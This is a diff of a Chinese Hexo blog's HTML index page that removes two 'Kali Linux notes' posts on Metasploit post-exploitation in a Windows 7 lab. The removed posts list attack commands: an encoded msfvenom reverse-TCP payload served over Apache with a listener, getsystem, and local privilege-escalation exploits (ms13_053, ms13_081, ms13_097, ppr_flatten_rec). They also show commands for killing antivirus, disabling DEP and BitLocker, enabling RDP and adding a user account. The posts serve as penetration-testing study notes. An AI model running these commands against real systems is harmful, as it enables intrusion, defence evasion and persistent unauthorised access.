-</li>
-<li>Kali<ul>
-<li>Bitclock磁盘加密<ul>
-<li><strong><code>🔺命令：shell</code></strong><ul>
-<li>关闭Bitclock加密：<strong><code>🔺命令：manage-bde -off C:</code></strong> </li>
-<li>查看Bitclokc加密状态：<strong><code>🔺命令：manage-bde -status C:</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-<li>关闭DEP<ul>
-<li>**`🔺命令：shell<ul>
-<li><strong><code>🔺命令：bcdedit.exe /set {current} nx AlwaysOff</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-<li>杀死防病毒软件<ul>
-<li><strong><code>🔺命令：run killav</code></strong> </li>
-<li><strong><code>🔺命令：run post/windows/manage/killav</code></strong></li>
-</ul>
-</li>
-<li>开启远程桌面服务<ul>
-<li><strong><code>🔺命令：run post/windows/manage/enable_rdp</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Window 7<ul>
-<li>查看远程桌面是否被开启</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>关闭远程桌面服务<ul>
-<li><strong><code>🔺命令：run multi_console_command -rc /root/.msf4/logs/scripts/getgui/ clean_up__20160824.1855.rc</code></strong> </li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Window 7<ul>
-<li>查看远程桌面是否被关闭</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>开启远程桌面GUI服务：<strong><code>🔺命令：run getgui –e</code></strong></li>
-<li>添加用户账号：<strong><code>🔺命令：run getgui -u yuanfh -p pass</code></strong></li>
-<li>查看远程桌面<ul>
-<li>截图：<strong><code>🔺命令：screenshot</code></strong></li>
-<li><strong><code>🔺命令：use/load espia</code></strong> <ul>
-<li><strong><code>🔺命令：help</code></strong></li>
-<li><strong><code>🔺命令：screengrab</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%85%AD)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%85%AD)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/" itemprop="url">Kali Linux笔记(一百零六)：MSF后渗透测试--漏洞提权</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-03T15:22:25+08:00">
-                2020-03-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  509 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  2 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-Msf后渗透测试阶段"><a href="#1-Msf后渗透测试阶段" class="headerlink" title="1. Msf后渗透测试阶段"></a>1. Msf后渗透测试阶段</h4><ul>
-<li>已经获得目标系统控制权后扩大战果<ul>
-<li>提权</li>
-<li>信息收集</li>
-<li>渗透内网</li>
-<li>永久后门</li>
-</ul>
-</li>
-<li>实验环境<ul>
-<li>Window 7<ul>
-<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
-<li>关闭防火墙</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-基于已有session扩大战果"><a href="#2-基于已有session扩大战果" class="headerlink" title="2. 基于已有session扩大战果"></a>2. 基于已有session扩大战果</h4><ul>
-<li>Kali<ul>
-<li><strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -i 7 -f exe -o 1.exe</code></strong></li>
-<li><strong><code>🔺命令：service apache2 start</code></strong></li>
-<li><strong><code>🔺命令：cp 1.exe /var/www/html</code></strong></li>
-<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
-<li><strong><code>🔺命令：use exploit/multi/handler</code></strong><ul>
-<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong></li>
-<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
-<li><strong><code>🔺命令：exploit</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Window 7<ul>
-<li>浏览器访问<a href="http://Kali的IP，下载保存1.exe" target="_blank" rel="noopener">http://Kali的IP，下载保存1.exe</a></li>
-<li>双击打开1.exe</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>查看是否拿到shell</li>
-<li><strong><code>🔺命令：session -l</code></strong></li>
-</ul>
-</li>
-</ul>
-<h4 id="3-获取system账号权限"><a href="#3-获取system账号权限" class="headerlink" title="3. 获取system账号权限"></a>3. 获取system账号权限</h4><ul>
-<li>Kali<ul>
-<li><strong><code>🔺命令：load priv</code></strong> </li>
-<li><strong><code>🔺命令：getsystem</code></strong> <ul>
-<li>priv_elevate_getsystem: Operation failed: Access is denied. </li>
-<li>priv_elevate_getsystem: Operation failed: The enviroment is incorrect.</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="4-利用漏洞直接提权为system-1"><a href="#4-利用漏洞直接提权为system-1" class="headerlink" title="4. 利用漏洞直接提权为system-1"></a>4. 利用漏洞直接提权为system-1</h4><ul>
-<li>Kali<ul>
-<li><strong><code>🔺命令：use exploit/windows/local/ms13_053_schlamperei</code></strong><ul>
-<li><strong><code>🔺命令：set session 1</code></strong></li>
-<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
-<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
-<li><strong><code>🔺命令：exploit</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
-<li>▲ 2020.03.02 Running against 64-bit systems is not supported，32位系统暂无实验</li>
-</ul>
-</li>
-</ul>
-<h4 id="5-利用漏洞直接提权为system-2"><a href="#5-利用漏洞直接提权为system-2" class="headerlink" title="5. 利用漏洞直接提权为system-2"></a>5. 利用漏洞直接提权为system-2</h4><ul>
-<li>Kali<ul>
-<li><strong><code>🔺命令：use exploit/windows/local/ms13_081_track_popup_menu</code></strong><ul>
-<li><strong><code>🔺命令：set session 1</code></strong></li>
-<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
-<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
-<li><strong><code>🔺命令：exploit</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
-<li>▲ 2020.03.02 Running against 64-bit systems is not supported，32位系统暂无实验</li>
-</ul>
-</li>
-</ul>
-<h4 id="6-利用漏洞直接提权为system-3"><a href="#6-利用漏洞直接提权为system-3" class="headerlink" title="6. 利用漏洞直接提权为system-3"></a>6. 利用漏洞直接提权为system-3</h4><ul>
-<li>Kali<ul>
-<li><strong><code>🔺命令：use exploit/windows/local/ms13_097_ie_registry_symlink</code></strong><ul>
-<li><strong><code>🔺命令：set session 1</code></strong></li>
-<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
-<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
-<li><strong><code>🔺命令：exploit</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
-<li>▲ 2020.03.02 Not-vulnerable;Not running inside an Internet Explorer process</li>
-</ul>
-</li>
-</ul>
-<h4 id="7-利用漏洞直接提权为system-4"><a href="#7-利用漏洞直接提权为system-4" class="headerlink" title="7. 利用漏洞直接提权为system-4"></a>7. 利用漏洞直接提权为system-4</h4><ul>
-<li>Kali<ul>
-<li><strong><code>🔺命令：use exploit/windows/local/ppr_flatten_rec</code></strong> <ul>
-<li><strong><code>🔺命令：set session 1</code></strong></li>
-<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
-<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
-<li><strong><code>🔺命令：exploit</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
-<li>▲ 2020.03.02 Running against 64-bit systems is not supported，32位系统暂无实验</li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3538,7 +3479,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">181</span>
+                  <span class="site-state-item-count">184</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3549,7 +3490,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -3560,7 +3501,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -3645,7 +3586,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">176.3k</span>
+    <span title="Site words total count">179.7k</span>
   
 </div>
 
